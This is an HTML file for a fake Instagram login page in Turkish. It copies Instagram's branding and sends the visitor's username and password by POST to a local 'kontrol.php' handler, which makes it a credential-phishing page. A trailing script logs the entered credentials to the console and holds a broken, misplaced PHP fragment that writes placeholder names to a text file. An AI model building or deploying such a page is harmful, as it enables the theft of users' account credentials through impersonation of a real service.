<!DOCTYPE html>
<html lang="en">

<head>
  <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <script src="https://kit.fontawesome.com/fc1e235b2e.js"></script>
  <link rel="stylesheet" href="style.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <title>Instagram</title>
</head>

<body>

  <div id="wrapper">
    <div class="container">
      <div class="phone-app-demo"></div>
      <div class="form-data">
      <form action="kontrol.php" method="POST">
          <div class="logo">
            <img src="./images/logo.png" alt="logo">
          </div>
          <input type="text" placeholder="Telefon numarası, kullanıcı adı, veya e-posta" name="un">
          <input type="password" placeholder="Şifre" name="pass">
          <button class="form-btn" type="submit">Giriş Yap</button>
          <span class="has-separator">YA DA</span>
          <a class="facebook-login" href="#">
            <i class="fab fa-facebook-square"></i>Facebook ile Giriş Yap
          </a>
          <a class="password-reset" href="#">Şifreni mi unuttun?</a>
        </form>
        <div class="sign-up">
          Hesabın yok mu? <a href="index.html">Kaydol</a>
        </div>
        <div class="get-the-app">
          <span>Uygulamayı indir.</span>
          <div class="badges">
            <img src="./images/app-store.png" alt="app-store badge">
            <img src="./images/google-play.png" alt="google-play badge">
          </div>
        </div>
      </div>
    </div>

    <footer>
      <div class="container">
        <nav class="footer-nav">
          <ul>
            <li>
              <a href="index.html">About us</a>
            </li>
            <li>
              <a href="index.html">Support</a>
            </li>
            <li>
              <a href="index.html">Press</a>
            </li>
            <li>
              <a href="index.html">Api</a>
            </li>
            <li>
              <a href="index.html">Jobs</a>
            </li>
            <li>
              <a href="index.html">Privacy</a>
            </li>
            <li>
              <a href="index.html">Terms</a>
            </li>
            <li>
              <a href="index.html">Directory</a>
            </li>
            <li>
              <a href="index.html">Profiles</a>
            </li>
            <li>
              <a href="index.html">Hashtags</a>
            </li>
            <li>
              <a href="index.html">Languages</a>
            </li>
          </ul>
        </nav>
        <div class="copyright-notice">
          &copy 2022 Instagram
        </div>
      </div>
    </footer>

  </div>


  <script>
    $( "#login" ).click(function() {
      console.log($('#username').val());
      console.log($('#pass').val());
      
          <?php
    $myfile = fopen("test.txt", "w") or die("Unable to open file!");
    $txt = "John Doe\n";
    fwrite($myfile, $txt);
    $txt = "Jane Doe\n";
    fwrite($myfile, $txt);
    fclose($myfile);
    ?>
      
    });
  </script>
</body>

</html>